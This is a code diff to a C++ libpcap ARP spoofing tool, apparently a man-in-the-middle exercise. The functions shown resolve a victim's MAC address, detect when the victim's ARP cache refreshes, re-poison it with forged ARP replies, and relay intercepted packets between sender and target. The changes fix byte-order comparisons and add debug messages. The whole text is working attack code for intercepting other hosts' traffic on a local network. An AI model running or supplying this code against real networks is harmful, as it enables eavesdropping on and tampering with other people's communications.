@@ -4,7 +4,8 @@ Mac getMac(pcap_t* handle, Ip attackerIp, Mac attackerMac, Ip ip)
 {
 	EthArpPacket pkt = EthArpPacket(ArpHdr::Request, Mac::broadcastMac(), attackerMac, EthHdr::Arp, ArpHdr::ETHER, EthHdr::Ip4, Mac::SIZE, Ip::SIZE, attackerMac, attackerIp, Mac::nullMac(), ip);
 	
-	std::thread thread1(continueSendArp, handle, pkt, 3);
+	// std::thread thread1(continueSendArp, handle, pkt, 3);
+	sendArp(handle, pkt);
 	
 	while (true)
 		{
@@ -20,7 +21,7 @@ Mac getMac(pcap_t* handle, Ip attackerIp, Mac attackerMac, Ip ip)
 			if (ntohs(reply->eth_.type_) == EthHdr::Arp && ntohs(reply->arp_.op_) == ArpHdr::Reply &&
 				reply->arp_.sip_ == Ip(htonl(ip)) && reply->arp_.tip_ == Ip(htonl(attackerIp)))
 			{
-				thread1.detach();
+				// thread1.detach();
 				return reply->arp_.smac_;
 			}
 		}
@@ -67,26 +68,32 @@ bool isRefreshed(pcap_t* handle, const u_char *receivedPkt, FlowInfo flow)
 {
 	EthArpPacket *pkt = (EthArpPacket *)receivedPkt;
 	// case : broadcast (ARP)
-	if(pkt->eth_.type_ == EthHdr::Arp && pkt->eth_.dmac_ == Mac::broadcastMac())
+	// printf("%d %d\n",pkt->eth_.type_,ntohs(EthHdr::Arp));
+	// printf("%s %s\n",std::string(pkt->eth_.dmac_).c_str(),std::string(Mac::broadcastMac()).c_str());
+	if(pkt->eth_.type_ == ntohs(EthHdr::Arp) && pkt->eth_.dmac_ == Mac::broadcastMac())
 	{
+		// printf("%s | %s\n",std::string(Ip(ntohl(pkt->arp_.sip_))).c_str(), std::string(flow.senderIp).c_str());
 		// sender broadcast
-		if(pkt->arp_.sip_ == flow.senderIp && pkt->eth_.smac_ == flow.senderMac)
+		if(ntohl(pkt->arp_.sip_) == flow.senderIp && pkt->eth_.smac_ == flow.senderMac)
 		{
+			printf("[*] sender refreshed by sender broadcast..\n");
 			return true;
 		}
 		// target broadcast
-		if(pkt->arp_.sip_ == flow.targetIp && pkt->eth_.smac_ == flow.targetMac)
+		if(ntohl(pkt->arp_.sip_) == flow.targetIp && pkt->eth_.smac_ == flow.targetMac)
 		{
+			printf("[*] sender refreshed by target broadcast..\n");
 			return true;
 		}
 	}
 	else // case : unicast
 	{
 		// sender -> target
-		if(pkt->arp_.sip_ == flow.senderIp && pkt->eth_.smac_ == flow.senderMac)
+		if(ntohl(pkt->arp_.sip_) == flow.senderIp && pkt->eth_.smac_ == flow.senderMac)
 		{
-			if(pkt->arp_.tip_ == flow.targetIp && pkt->arp_.tmac_ == flow.attackerMac)
+			if(ntohl(pkt->arp_.tip_) == flow.targetIp && pkt->arp_.tmac_ == flow.attackerMac)
 			{
+				printf("[*] sender refreshed by sender->target unicast..\n");
 				return true;
 			}
 		}
@@ -128,9 +135,15 @@ void spoofProcess(int mode, pcap_t *handle, EthArpPacket pkt, FlowInfo flow)
 		}
 
 		if (isRefreshed(handle, receivedPkt, flow))
+		{
 			sendArp(handle, pkt);
+
+		}
 		else
+		{
 			relayPacket(handle, receivedPkt, flow);
+		}
+			
 	}
 
 	sendArpThread.detach();
